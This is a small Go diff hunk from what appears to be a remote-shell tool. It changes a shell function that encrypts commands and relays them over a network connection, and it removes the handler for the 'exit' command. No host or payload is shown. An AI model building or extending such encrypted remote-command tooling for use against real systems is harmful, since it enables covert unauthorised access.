@@ -62,9 +62,6 @@ func shell(conn net.Conn) {
 			encShellCmd := encrypt(shellCmd)
 			enc.Encode(encShellCmd)
 			break shellLoop
-		case shellCmd == "exit":
-			exit(conn)
-			break shellLoop
 		default:
 			result := ""
 			encShellCmd := encrypt(shellCmd)
